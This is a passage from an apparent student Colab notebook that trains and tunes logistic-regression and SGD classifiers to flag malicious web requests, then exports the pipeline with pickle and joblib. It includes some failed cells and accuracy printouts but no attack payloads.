        "  'c_vect__ngram_range': ((1, 3),), # (1, 4), (1, 5)),  # unigrams or bigrams\r\n",
        "  'model__C': (0.1,), # 1e6, 1e8),\r\n",
        "  'model__class_weight': ({1: 2 * len(good_requests) / len(bad_requests), 0: 1.0},),\r\n",
        "  # 'tfidf__use_idf': (True, False),\r\n",
        "  # 'tfidf__norm': ('l1', 'l2'),\r\n",
        "  # 'clf__max_iter': (20,),\r\n",
        "  # 'clf__alpha': (0.00001, 0.000001),\r\n",
        "  # 'clf__penalty': ('l2', 'elasticnet'),\r\n",
        "  # 'clf__max_iter': (10, 50, 80),\r\n",
        "}"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Fh5U3EVMjr8e"
      },
      "source": [
        "grid_search = GridSearchCV(pipeline, parameters, n_jobs=-1, verbose=1)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 306
        },
        "id": "BEMP0d-3jt-t",
        "outputId": "2b68677e-d756-45c1-d197-56c5bfd5ceb3"
      },
      "source": [
        "grid_search.fit(list(trn_term_doc), trn_y)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "ValueError",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mValueError\u001b[0m                                Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-86-a6faf787d4b1>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mgrid_search\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mlist\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mx\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtrn_y\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/model_selection/_search.py\u001b[0m in \u001b[0;36mfit\u001b[0;34m(self, X, y, groups, **fit_params)\u001b[0m\n\u001b[1;32m    648\u001b[0m             \u001b[0mrefit_metric\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m'score'\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    649\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 650\u001b[0;31m         \u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mgroups\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mindexable\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mgroups\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    651\u001b[0m         \u001b[0mfit_params\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0m_check_fit_params\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfit_params\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    652\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/utils/validation.py\u001b[0m in \u001b[0;36mindexable\u001b[0;34m(*iterables)\u001b[0m\n\u001b[1;32m    246\u001b[0m     \"\"\"\n\u001b[1;32m    247\u001b[0m     \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m[\u001b[0m\u001b[0m_make_indexable\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mfor\u001b[0m \u001b[0mX\u001b[0m \u001b[0;32min\u001b[0m \u001b[0miterables\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 248\u001b[0;31m     \u001b[0mcheck_consistent_length\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0mresult\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    249\u001b[0m     \u001b[0;32mreturn\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    250\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/utils/validation.py\u001b[0m in \u001b[0;36mcheck_consistent_length\u001b[0;34m(*arrays)\u001b[0m\n\u001b[1;32m    210\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0muniques\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m>\u001b[0m \u001b[0;36m1\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    211\u001b[0m         raise ValueError(\"Found input variables with inconsistent numbers of\"\n\u001b[0;32m--> 212\u001b[0;31m                          \" samples: %r\" % [int(l) for l in lengths])\n\u001b[0m\u001b[1;32m    213\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    214\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mValueError\u001b[0m: Found input variables with inconsistent numbers of samples: [48899, 39119]"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_W-T4tYyjv_l",
        "outputId": "a968deb6-96a1-4c5e-9094-3bf3b2fa779f"
      },
      "source": [
        "grid_search.best_score_"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "nan"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 210
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "UOnb7KZerHoY"
      },
      "source": [
        "## 7.2 Custom parameter search"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Ry8iEMCxrM1_"
      },
      "source": [
        "def set_pipe(ngram, max_features, c):\r\n",
        "  t_vtrz, c_vtrz = get_vectorizers('word', ngram, max_features)\r\n",
        "  mdl = LogisticRegression(C=c, class_weight={1: 2 * len(good_requests) / len(bad_requests), 0: 1.0})\r\n",
        "  return t_ctrz, c_vtrz, mdl, mdl"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "kXFjyC_gIrTg"
      },
      "source": [
        "ng = [(1,3)] # , (1,4), (1,5)\r\n",
        "mf = [30000, 40000, 50000]\r\n",
        "cc = [1e4] # , 5000, 2e4\r\n",
        "# for comb in itertools.product(ng, mf, cc):\r\n",
        "#   print(comb)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "kj7uWn9FvBsY",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "5ca6705f-b201-4cdd-87d8-ec531d8e685a"
      },
      "source": [
        "for comb in itertools.product(ng, mf, cc):\r\n",
        "  # t_ctrz, c_ctrz, mdl_t, mdl_c = set_pipe(comb[0], comb[1], comb[2])\r\n",
        "  t_ctrz, c_ctrz = get_vectorizers('word', comb[0], comb[1])\r\n",
        "  mdl_t = LogisticRegression(C=comb[2], class_weight={1: 2 * len(good_requests) / len(bad_requests), 0: 1.0})\r\n",
        "  mdl_c = LogisticRegression(C=comb[2], class_weight={1: 2 * len(good_requests) / len(bad_requests), 0: 1.0})\r\n",
        "  mdl_sgd = SGDClassifier(loss='hinge', penalty='l2', alpha=1e-3, random_state=42, max_iter=5, tol=None)\r\n",
        "  # tfidf\r\n",
        "  X1 = t_ctrz.fit_transform(x)\r\n",
        "  X_train, X_test, y_train, y_test = train_test_split(X1, y, test_size=0.7, random_state=42)\r\n",
        "  mdl_t.fit(X_train, y_train)\r\n",
        "  tf_preds1 = mdl_t.predict(X_test)\r\n",
        "  # count\r\n",
        "  trn_y, test_y = split_val(y)\r\n",
        "  trn_x, test_x = split_val(x)\r\n",
        "  trn_term_doc = c_ctrz.fit_transform(trn_x)\r\n",
        "  val_term_doc = c_ctrz.transform(test_x)\r\n",
        "  y1 = trn_y\r\n",
        "  x1 = trn_term_doc.sign()\r\n",
        "  c_test_x = val_term_doc.sign()\r\n",
        "  p = x1[y1==1].sum(0)+1\r\n",
        "  q = x1[y1==0].sum(0)+1\r\n",
        "  r = np.log((p/p.sum())/(q/q.sum()))\r\n",
        "  b = np.log(len(p)/len(q))\r\n",
        "  mdl_c.fit(x1, y1)\r\n",
        "  c_preds1 = mdl_c.predict(val_term_doc)\r\n",
        "  # SGD\r\n",
        "  mdl_sgd.fit(trn_term_doc, trn_y)\r\n",
        "  sgd_preds = mdl_sgd.predict(val_term_doc)\r\n",
        "  # print result\r\n",
        "  print(\"=\"*10+f\" Params - ngram: {comb[0]}, max_features: {comb[1]}, regularization: {comb[2]}\")\r\n",
        "  print(\"... TfidfVectorizer:\")\r\n",
        "  print_score(mdl_t, dft, tf_preds1, X_test, y_test)\r\n",
        "  print(\"... CountVectorizer:\")\r\n",
        "  print_score(mdl_c, dft, c_preds1, val_term_doc, test_y)\r\n",
        "  print(\"... SGDClassifier: \")\r\n",
        "  print(f'accuracy: {metrics.accuracy_score(sgd_preds, test_y)}')"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "/usr/local/lib/python3.6/dist-packages/sklearn/linear_model/_logistic.py:940: ConvergenceWarning: lbfgs failed to converge (status=1):\n",
            "STOP: TOTAL NO. of ITERATIONS REACHED LIMIT.\n",
            "\n",
            "Increase the number of iterations (max_iter) or scale the data as shown in:\n",
            "    https://scikit-learn.org/stable/modules/preprocessing.html\n",
            "Please also refer to the documentation for alternative solver options:\n",
            "    https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression\n",
            "  extra_warning_msg=_LOGISTIC_SOLVER_CONVERGENCE_MSG)\n",
            "/usr/local/lib/python3.6/dist-packages/sklearn/linear_model/_logistic.py:940: ConvergenceWarning: lbfgs failed to converge (status=1):\n",
            "STOP: TOTAL NO. of ITERATIONS REACHED LIMIT.\n",
            "\n",
            "Increase the number of iterations (max_iter) or scale the data as shown in:\n",
            "    https://scikit-learn.org/stable/modules/preprocessing.html\n",
            "Please also refer to the documentation for alternative solver options:\n",
            "    https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression\n",
            "  extra_warning_msg=_LOGISTIC_SOLVER_CONVERGENCE_MSG)\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "stream",
          "text": [
            "========== Params - ngram: (1, 3), max_features: 30000, regularization: 10000.0\n",
            "... TfidfVectorizer:\n",
            "Accuracy: 0.992989\n",
            "Precision: 0.990467\n",
            "Recall: 0.999030\n",
            "F1-Score: 0.994730\n",
            "AUC: 0.999680\n",
            "... CountVectorizer:\n",
            "Accuracy: 0.998978\n",
            "Precision: 0.999224\n",
            "Recall: 0.999321\n",
            "F1-Score: 0.999273\n",
            "AUC: 0.999884\n",
            "... SGDClassifier: \n",
            "accuracy: 0.9950920245398773\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "stream",
          "text": [
            "/usr/local/lib/python3.6/dist-packages/sklearn/linear_model/_logistic.py:940: ConvergenceWarning: lbfgs failed to converge (status=1):\n",
            "STOP: TOTAL NO. of ITERATIONS REACHED LIMIT.\n",
            "\n",
            "Increase the number of iterations (max_iter) or scale the data as shown in:\n",
            "    https://scikit-learn.org/stable/modules/preprocessing.html\n",
            "Please also refer to the documentation for alternative solver options:\n",
            "    https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression\n",
            "  extra_warning_msg=_LOGISTIC_SOLVER_CONVERGENCE_MSG)\n",
            "/usr/local/lib/python3.6/dist-packages/sklearn/linear_model/_logistic.py:940: ConvergenceWarning: lbfgs failed to converge (status=1):\n",
            "STOP: TOTAL NO. of ITERATIONS REACHED LIMIT.\n",
            "\n",
            "Increase the number of iterations (max_iter) or scale the data as shown in:\n",
            "    https://scikit-learn.org/stable/modules/preprocessing.html\n",
            "Please also refer to the documentation for alternative solver options:\n",
            "    https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression\n",
            "  extra_warning_msg=_LOGISTIC_SOLVER_CONVERGENCE_MSG)\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "stream",
          "text": [
            "========== Params - ngram: (1, 3), max_features: 40000, regularization: 10000.0\n",
            "... TfidfVectorizer:\n",
            "Accuracy: 0.992989\n",
            "Precision: 0.990467\n",
            "Recall: 0.999030\n",
            "F1-Score: 0.994730\n",
            "AUC: 0.999680\n",
            "... CountVectorizer:\n",
            "Accuracy: 0.998978\n",
            "Precision: 0.999224\n",
            "Recall: 0.999321\n",
            "F1-Score: 0.999273\n",
            "AUC: 0.999884\n",
            "... SGDClassifier: \n",
            "accuracy: 0.9950920245398773\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "stream",
          "text": [
            "/usr/local/lib/python3.6/dist-packages/sklearn/linear_model/_logistic.py:940: ConvergenceWarning: lbfgs failed to converge (status=1):\n",
            "STOP: TOTAL NO. of ITERATIONS REACHED LIMIT.\n",
            "\n",
            "Increase the number of iterations (max_iter) or scale the data as shown in:\n",
            "    https://scikit-learn.org/stable/modules/preprocessing.html\n",
            "Please also refer to the documentation for alternative solver options:\n",
            "    https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression\n",
            "  extra_warning_msg=_LOGISTIC_SOLVER_CONVERGENCE_MSG)\n",
            "/usr/local/lib/python3.6/dist-packages/sklearn/linear_model/_logistic.py:940: ConvergenceWarning: lbfgs failed to converge (status=1):\n",
            "STOP: TOTAL NO. of ITERATIONS REACHED LIMIT.\n",
            "\n",
            "Increase the number of iterations (max_iter) or scale the data as shown in:\n",
            "    https://scikit-learn.org/stable/modules/preprocessing.html\n",
            "Please also refer to the documentation for alternative solver options:\n",
            "    https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression\n",
            "  extra_warning_msg=_LOGISTIC_SOLVER_CONVERGENCE_MSG)\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "stream",
          "text": [
            "========== Params - ngram: (1, 3), max_features: 50000, regularization: 10000.0\n",
            "... TfidfVectorizer:\n",
            "Accuracy: 0.992989\n",
            "Precision: 0.990467\n",
            "Recall: 0.999030\n",
            "F1-Score: 0.994730\n",
            "AUC: 0.999680\n",
            "... CountVectorizer:\n",
            "Accuracy: 0.998978\n",
            "Precision: 0.999224\n",
            "Recall: 0.999321\n",
            "F1-Score: 0.999273\n",
            "AUC: 0.999884\n",
            "... SGDClassifier: \n",
            "accuracy: 0.9950920245398773\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "X9RGqztXK7Lq",
        "outputId": "800a30f7-653a-484e-94a1-7c61999d3e27"
      },
      "source": [
        "mdl_sgd.score(trn_term_doc, trn_y)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0.9928423266820532"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 74
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "FiTjLSleMM_A",
        "outputId": "bbe2627c-6aeb-4e48-fb81-69857b0be2a3"
      },
      "source": [
        "pr = c_ctrz.transform(['@die'])\r\n",
        "mdl_c.predict(pr)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array([ True])"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 75
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "OZICIRFKmfRN"
      },
      "source": [
        "# 8 Export model"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "_BZJP4v6yPU0"
      },
      "source": [
        "## 8.1 Pickle"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Rt2lGtc-mhEb"
      },
      "source": [
        "import pickle\r\n",
        "\r\n",
        "model_mypath = 'drive/My Drive/Colab Notebooks/AIacademy/class-C/project/model.pkl'\r\n",
        "with open(model_mypath, 'wb') as f:\r\n",
        "    pickle.dump(final_model, f)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "VYybNAzXyRI9"
      },
      "source": [
        "## 8.2 Joblib"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "S0aa5J4Ploat",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 163
        },
        "outputId": "289632c7-b78c-4329-dde3-a00bdd150dac"
      },
      "source": [
        "final_model = tf_m.fit(X, y)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "NameError",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-80-798ca5808578>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mfinal_model\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtf_m\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
            "\u001b[0;31mNameError\u001b[0m: name 'X' is not defined"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "sjpfwlWTzBuJ"
      },
      "source": [
        "pipeline = Pipeline(steps= [('tfidf', TfidfVectorizer(ngram_range=(1,3),\r\n",
        "                                                      min_df=0.0, \r\n",
        "                                                      analyzer='word', \r\n",
        "                                                      sublinear_tf=True)),\r\n",
        "                            ('model', LogisticRegression(C=1e8))])\r\n",
        "                                # class_weight={1: 2 * len(good_requests) / len(bad_requests), 0: 1.0}))])"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "HKSnl5vTzmUn",
        "outputId": "05cdb122-7f8b-4886-b845-f010d1bae82a"
      },
      "source": [
        "pipeline.fit(x, y)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Pipeline(memory=None,\n",
              "         steps=[('tfidf',\n",
              "                 TfidfVectorizer(analyzer='word', binary=False,\n",
              "                                 decode_error='strict',\n",
              "                                 dtype=<class 'numpy.float64'>,\n",
              "                                 encoding='utf-8', input='content',\n",
              "                                 lowercase=True, max_df=1.0, max_features=None,\n",
              "                                 min_df=0.0, ngram_range=(1, 3), norm='l2',\n",
              "                                 preprocessor=None, smooth_idf=True,\n",
              "                                 stop_words=None, strip_accents=None,\n",
              "                                 sublinear_tf=True,\n",
              "                                 token_pattern='(?u)\\\\b\\\\w\\\\w+\\\\b',\n",
              "                                 tokenizer=None, use_idf=True,\n",
              "                                 vocabulary=None)),\n",
              "                ('model',\n",
              "                 LogisticRegression(C=100000000.0, class_weight=None,\n",
              "                                    dual=False, fit_intercept=True,\n",
              "                                    intercept_scaling=1, l1_ratio=None,\n",
              "                                    max_iter=100, multi_class='auto',\n",
              "                                    n_jobs=None, penalty='l2',\n",
              "                                    random_state=None, solver='lbfgs',\n",
              "                                    tol=0.0001, verbose=0, warm_start=False))],\n",
              "         verbose=False)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 82
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "flsVjBKxzwmL",
        "outputId": "0f0d7a16-b630-4909-9441-b03fe7678821"
      },
      "source": [
        "pipeline.predict(['home'])"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array([ True])"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 89
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "XouYQcAty9Jd",
        "outputId": "11f02ada-b3df-4e58-aa8b-e3d181c54463"
      },
      "source": [
        "from joblib import dump\r\n",
        "# dump the pipeline model\r\n",
        "dump(pipeline, filename=\"drive/My Drive/Colab Notebooks/AIacademy/class-C/project/model_pipe.joblib\")"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['drive/My Drive/Colab Notebooks/AIacademy/class-C/project/model_pipe.joblib']"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 61
        }
      ]
    }
  ]
}